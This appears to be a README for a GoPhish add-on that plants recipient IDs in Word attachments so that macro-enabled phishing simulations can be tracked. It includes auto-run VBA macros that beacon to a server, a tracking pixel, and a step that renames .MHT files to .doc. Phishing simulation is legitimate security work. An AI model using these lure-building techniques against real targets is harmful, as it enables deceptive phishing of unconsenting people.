# gophish-macro-attachment
Exim transport_filter python script that puts a user's RID value where a macro can see it for macro phishing

# Usage
1. Requires Python 3.6 and [olefile](https://pypi.org/project/olefile/)
2. Install exim (listen on loopback); then add this script's path into `exim.conf` as a `transport_filter` for the `remote_smtp` transport (e.g. `transport_filter = "/usr/bin/python3 /path/to/script.py"`). See [here](https://www.exim.org/exim-html-current/doc/html/spec_html/ch-generic_options_for_transports.html) for more information.
3. Set up a GoPhish sending profile that points at this local Exim instance
4. Create an email attachment & template per the following

## Email template
The email template can be whatever you want, but must include the following exactly somewhere in the body: 

`<!-- RID: {{.RId}} -->`

This is how the script knows the user's RID. It will be removed by the script, so don't worry if you're sending a plain text email.

Next, add an attachment created as follows:

### Type 1 (OLE document format)

N.B.: The drawback to this form is that it does not support "Clicked link" status; you will only know if the user enabled macros.
However, it is simpler and is probably less suspicious (to spam filters, at least). 

1. Create a Word Document and add a macro like the following under ThisDocument: 

```
Private Sub Document_Open()
  Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
  URL = "http://YourGoPhishServer.com/?rid=" & Replace(ActiveDocument.BuiltInDocumentProperties("Comments"),".","")
  objHTTP.Open "POST", URL, False
  objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
  objHTTP.send("")
End Sub
```
2. Add whatever enticing content you want to the body. 
3. Save in Word 97-2003 format (.doc)
4. Right click the file in Explorer, choose Properties, click the Details tab
5. Set "Comments" to `{{.RidPlaceholder}}`

### Type 2 (MHT/MHTML format)

This is slightly more complex to create and more suspicious; however, it will show you if the user opened the document without enabling macros.

1. Create a Word Document, save as .MHT (Single file webpage)
2. Add whatever enticing content you'd like to the document.
3. Add a macro like the following under ThisDocument: 
```
Private Sub Document_Open()
  Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
  URL = "http://YourGoPhishServer.com/?rid=" & ActiveDocument.BuiltInDocumentProperties("Author")
  objHTTP.Open "POST", URL, False
  objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
  objHTTP.send("")
End Sub
```
4. Save
5. Open the .MHT file in Notepad/Notepad++
6. Look for the following lines near the top: 
```
 <o:DocumentProperties>
  <o:Author>John</o:Author>
  <o:LastAuthor>John</o:LastAuthor>
```
7. Replace the "Author" value with `{{.RIDPLACEHOLDER}}` (case-sensitive)
8. Look for the end of the body of the document (e.g. `</body>`)
9. Type the following right before the `</div></body>` portion:
```
<img src=3D"http://YourGoPhishServer/?rid=3D{{.RIDPLACEHOLDER}}" height=3D1 width=3D1/>
```

N.B. The "3D" parts are VERY IMPORTANT to this working properly. It's part of how the document is encoded/escaped. 
I would suggest copying it exactly as shown and just modifying the server URL.

10. Attach this file with the .MHT extension - it will be renamed to .doc by the script.


Have fun!
